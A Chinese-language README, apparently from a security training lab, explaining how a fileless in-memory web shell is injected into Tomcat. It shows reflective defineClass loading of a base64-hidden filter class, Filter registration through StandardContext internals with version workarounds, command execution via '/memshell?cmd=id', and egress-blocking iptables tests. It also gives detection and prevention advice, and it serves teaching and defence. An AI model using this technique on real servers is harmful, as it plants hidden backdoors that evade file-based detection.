# 内存马原理（Java / Tomcat 9）

本文件解释 `08-freemarker-memshell` 里那条链为什么成立，以及实测踩到的版本坑。
配套代码：

- payload 侧：[`../src/main/java/com/lab/themepreview/memshell/InjectHelper.java`](../src/main/java/com/lab/themepreview/memshell/InjectHelper.java)
- 被注入物：[`../memshell-plugin/com/lab/themepreview/memshell/plugin/MemshellFilter.java`](../memshell-plugin/com/lab/themepreview/memshell/plugin/MemshellFilter.java)
- 生成脚本：[`../build-memshell.ps1`](../build-memshell.ps1)

---

## 1. 什么是「内存马」

Web 中间件（Tomcat / Spring MVC / Flask / …）在运行时把请求分发给一组**放在内存里的对象**：
Servlet、Filter、Valve、路由表、拦截器链……这些结构本身都是可写的。
**内存马 = 用代码执行能力，往这些运行时结构里插一个自己的处理单元**，于是：

- 不需要写任何文件（不落盘、无文件特征）；
- 复用已经开放的**入向**端口与链路（天然不需要出网）；
- 只在当前进程生命周期内存在（进程重启即消失）。

对 Tomcat 来说，最常用、也最稳的插法就是 **Filter**：
Filter 在 Servlet 之前执行，可以自己结束响应（`chain.doFilter` 都不用调），
`/*` 映射下等于接管所有请求。

## 2. 三个必要环节

### 2.1 把字节码藏在哪里

`MemshellFilter` **不打进应用的 jar**——它只作为一份 base64 常量存在 payload 里：

```java
// InjectHelper
public static final String MEMSHELL_CLASS_B64 = "yv66vgAAADQ...";
```

好处：

- 目标机器上没有任何 `MemshellFilter.class` 文件，`grep` / 文件完整性检查查不到；
- 一份 payload 自包含，`defineClass` 之后这个类只存在于 JVM 的元空间/堆里。

生成方式：`build-memshell.ps1` 用 JDK8 编译 `MemshellFilter.java`
（`-source 1.8 -target 1.8`，校验 `major version: 52`），base64 后：
一份写入 `../src/main/resources/memshell/MemshellFilter.class.b64`（方便核对），
一份回填到 `InjectHelper.MEMSHELL_CLASS_B64`。

> 字节码版本必须 ≤ 运行 JDK。运行镜像是 JDK8，所以编译目标必须是 1.8；
> 用 JDK11 编译出的 `major version 55` 类，在 JDK8 上会直接
> `UnsupportedClassVersionError`。

### 2.2 把字节码变成类

```java
ClassLoader cl = InjectHelper.class.getClassLoader();   // 优先：应用自己的加载器
Method m = ClassLoader.class.getDeclaredMethod(
        "defineClass", String.class, byte[].class, int.class, int.class);
m.setAccessible(true);
Class<?> memshell = (Class<?>) m.invoke(cl, className, bytes, 0, bytes.length);
```

实测在这个靶场里，`InjectHelper` 自己的加载器就是
`org.springframework.boot.loader.LaunchedURLClassLoader`（Spring Boot 的嵌套 jar 加载器），
调用成功，返回的 `Class` 的加载器也是它——**Filter 类因此能看见 `javax.servlet.*`
与 Tomcat 的内部类**（父加载器里都有）。

兜底顺序（`InjectHelper.defineClass`）：

1. 应用类加载器（上面的写法）；
2. Tomcat 的 `WebappClassLoaderBase`（从 TCCL 往上找）；
3. `Thread.currentThread().getContextClassLoader()`；
4. 自建 `URLClassLoader(parent=app)` + 匿名子类里调 `defineClass`（经典
   `FlushableClassLoader` 写法）。

### 2.3 把 Filter 挂进运行中的容器

拿到 `ServletContext` 后，沿私有字段走到 Tomcat 的 `StandardContext`：

```text
org.apache.catalina.core.ApplicationContextFacade   (就是 request.getServletContext())
  └─ private final ApplicationContext context
       └─ private final StandardContext context
            = org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext
```

然后调三个方法（都在 `StandardContext` 上，`ContainerBase`/`Context` 继承体系提供）：

```java
context.addFilterDef(filterDef);   // FilterDef{ filterName, filter, filterClass }
context.addFilterMap(filterMap);   // FilterMap{ filterName, urlPatterns = ["/*"] }
context.filterStart();             // 重建 filter chain，下一次请求立即生效
```

`FilterDef` / `FilterMap` 的构造：Tomcat 8+ 在
`org.apache.tomcat.util.descriptor.web` 包下，无参构造 + setter。

实测 `addFilterMap` 返回 `true`、`filterStart()` 返回 `true`，
随后 `GET /memshell?cmd=id` 立刻可用（**不需要重启、不需要重新部署**）。

## 2.1.1 出网封锁的实测边界

本靶场用三条 `iptables` 规则切断出网（`entrypoint.sh`）：

```sh
iptables -A OUTPUT ! -o lo -p tcp --syn -j DROP   # 非环回的新建 TCP 连接
iptables -A OUTPUT -p udp --dport 53 -j DROP      # DNS over UDP
iptables -A OUTPUT -p tcp --dport 53 -j DROP      # DNS over TCP
```

### 为什么不能写 `-o eth0`

早期版本照搬的是 `-o eth0` 形式，有两个真实缺陷（本机实测确认）：

1. **接口名不保证是 `eth0`**：compose 自定义网络、CNI、IPv6-only 等场景都可能不同，
   写死接口名会导致「规则装上了但根本不匹配」的静默失效——比报错更危险。
2. **Docker 内嵌 DNS 解析器在 `127.0.0.11`，走环回**：
   `-o eth0 -p udp --dport 53` 永远匹配不到它。
   实测：装好规则后 `nslookup example.com` **仍然成功**，而该规则的**包计数器一直为 0**。

改成 `! -o lo`（而不是无条件全丢）是刻意的：**环回必须保持通畅**，
否则容器内自检 `curl 127.0.0.1:8080`、compose 的 healthcheck 全部会失效。

### 用包计数器说话（本机 Docker Desktop for Windows / WSL2，x86_64）

```text
# 规则本身
-P OUTPUT ACCEPT
-A OUTPUT ! -o lo -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j DROP
-A OUTPUT -p udp -m udp --dport 53 -j DROP
-A OUTPUT -p tcp -m tcp --dport 53 -j DROP

# 出向 TCP 尝试之后
num  pkts bytes target prot opt in  out     ...
1       5   300 DROP   tcp  --  *   !lo     tcp flags:0x17/0x02     <- 计数增长 = 规则真的在拦
2       0     0 DROP   udp  --  *   *       udp dpt:53
3       0     0 DROP   tcp  --  *   *       tcp dpt:53

# 直连外部解析器之后
2       1    57 DROP   udp  --  *   *       udp dpt:53             <- 计数增长
```

| 检查 | 结果 |
|------|------|
| 出向 TCP 到公网 IP | **已阻断**（`download timed out`，规则 #1 计数 5） |
| 直连外部解析器 `nslookup example.com 8.8.8.8` | **已阻断**（`Operation not permitted`，规则 #2 计数 1） |
| 走 Docker 内嵌 resolver（`127.0.0.11`） | **仍然可用**（规则 #2/#3 计数保持 0） |
| 入向已发布端口 | 正常（宿主 `GET /healthz` → 200） |
| 容器内 → `127.0.0.1:8080` | 正常（环回未被封） |

**诚实结论**：

- 反弹 shell、外连下载 payload —— **两类平台都阻断**，这是本靶场的教学前提，实测成立；
- 直连外部 DNS —— 已阻断；
- 但 **Docker Desktop（WSL2）上走内嵌 resolver 的域名解析不受容器 netfilter 管辖**，
  因此在该平台**不能宣称「DNSLog 式外带被完全排除」**。
  原生 Linux Docker 上 DNS 规则才真正作用在容器 netfilter 内，
  换平台必须用同样的计数器方法重新验证，不要照搬结论。

> 对教学的影响：本靶场要教的是「不出网时只能走内存马」。
> 出向 TCP 被阻断这一点已经足以让反弹 shell / 下载 payload 失效，
> 核心结论不受影响；但 DNSLog 能否用取决于部署平台，请如实告知学员。

## 3. 实测踩到的三个版本坑

出题/复现时最容易卡在这三处，全部有明确报错：

| # | 现象 | 原因 | 正确写法 |
|---|------|------|----------|
| 1 | `FAIL cannot-resolve-StandardContext from org.apache.catalina.core.ApplicationContextFacade@…` | 用 `o.getClass().getName().equals("org.apache.catalina.core.StandardContext")` 判等；而 Spring Boot 内嵌 Tomcat 实际是 `TomcatEmbeddedContext`（**子类**） | `StandardContext.class.isInstance(o)`，或直接看字段类型 `field_context_type == org.apache.catalina.core.StandardContext` |
| 2 | `java.lang.ClassNotFoundException: org.apache.catalina.deploy.FilterDef` | Tomcat 7 的包名是 `org.apache.catalina.deploy.*`；Tomcat 8+ 挪到 `org.apache.tomcat.util.descriptor.web.*` | 两个包名依次 `Class.forName` 兜底（`loadFirst`） |
| 3 | `java.lang.NoSuchMethodException: FilterDef.setFilter(com.lab...MemshellFilter)` | `setFilter` 的形参声明是**接口** `javax.servlet.Filter`，用 `getMethod(name, value.getClass())` 精确匹配找不到 | 遍历方法，按 `paramType.isAssignableFrom(value.getClass())` 挑重载；基本类型再补一层装箱判断 |

另外两个非致命但要注意的点：

- **`Context` 字段是 `private final`**：JDK8 上 `setAccessible(true)` 即可；
  JDK17+ 需要 `--add-opens java.base/java.lang=ALL-UNNAMED`
  （这也是本靶场刻意选 JDK8/Boot 2.7 的原因之一）。
- **`filterStart()` 会重建整条 chain**：标准 Filter 不需要重新 `init`，
  但自己往链里加过非标准 Filter 的场景要留意。

## 4. 同构思路（其它中间件）

内存马的「三个环节」在所有 Java Web 容器里都成立，只是第三环节不同：

| 容器/框架 | 可插入的运行时结构 | 关键类 |
|-----------|-------------------|--------|
| Tomcat（本靶场） | Filter / Servlet / Valve | `StandardContext.addFilterDef/addFilterMap/filterStart` |
| Spring MVC | 运行时路由 | `RequestMappingHandlerMapping.registerMapping` |
| Spring WebFlux | 运行时路由 | `RouterFunctionMapping` / `HandlerMapping` |
| Jetty | `ServletHandler` | `addFilterWithMapping` |
| WebLogic / Resin | Filter/Servlet | 各自 `WebAppContext` |
| Flask（对照：[`07-flask-memshell`](../../07-flask-memshell/README.md)） | `url_map._rules` / `before_request_funcs` | 绕过 `setupmethod` 直接改数据结构 |

Python 版的 `before_request` 钩子与 Java 版的 Filter 是**完全同构**的：
都是「不注册路由、而是插到请求处理的必经之处，且不触发时行为与业务一致」。

## 5. 检测与防御（站在出题人视角）

- **检测**：`FilterDef`/`FilterMap` 数量与部署时不一致、`defineClass` 调用、
  类加载器里出现无名类、以及访问日志里出现「部署后新增的 URL 且参数是命令」。
  Java 8 起 `ClassLoader#defineClass` 有了 `java.lang.ClassLoader.defineClass`
  的 JFR 事件可以监控。
- **预防**：模板引擎**永远不要**用 `UNRESTRICTED_RESOLVER`（FreeMarker 默认就够安全）；
  依赖版本及时升级（`Execute`/`ObjectConstructor` 这类危险类在新版本已被移除）；
  容器内以非 root 运行、只读根文件系统——但注意这些**都挡不住内存马**
  （它不需要写文件、也不需要 root），所以**根本还是在注入点本身**。
